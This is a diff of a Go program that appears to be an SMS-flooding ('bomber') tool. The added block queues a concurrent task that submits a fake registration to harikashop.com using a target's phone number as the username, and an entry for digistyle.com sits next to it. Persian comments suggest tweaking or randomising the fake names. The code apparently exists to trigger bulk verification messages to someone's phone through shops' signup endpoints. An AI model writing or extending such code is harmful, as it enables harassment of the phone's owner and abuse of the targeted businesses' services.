@@ -290,7 +290,22 @@ func main() {
 
 
 
-
+     // harikashop.com - register (ثبت نام - شامل پارامترهای دینامیک و فیلدهای بیشتر)
+    wg.Add(1)
+    tasks <- func() {
+        formData := url.Values{}
+        // formData.Set("back", "https://harikashop.com/") // ممکن است دینامیک باشد
+        formData.Set("id_customer", "")
+        // formData.Set("back", "") // تکراری، حذف شد
+        formData.Set("firstname", "Test") // می‌توانید تغییر دهید یا تصادفی کنید
+        formData.Set("lastname", "User") // می‌توانید تغییر دهید یا تصادفی کنید
+        formData.Set("password", "TestPass123") // ممکن است نیاز به پسورد قوی داشته باشد
+        formData.Set("action", "register")
+        formData.Set("username", phone)
+        // formData.Set("back", "https://harikashop.com/") // تکراری، حذف شد
+        formData.Set("ajax", "1")
+        sendFormRequest(ctx, "https://harikashop.com/login?back=https%3A%2F%2Fharikashop.com%2F", formData, &wg, ch)
+    }
        // digistyle.com
      wg.Add(1)
     tasks <- func() {
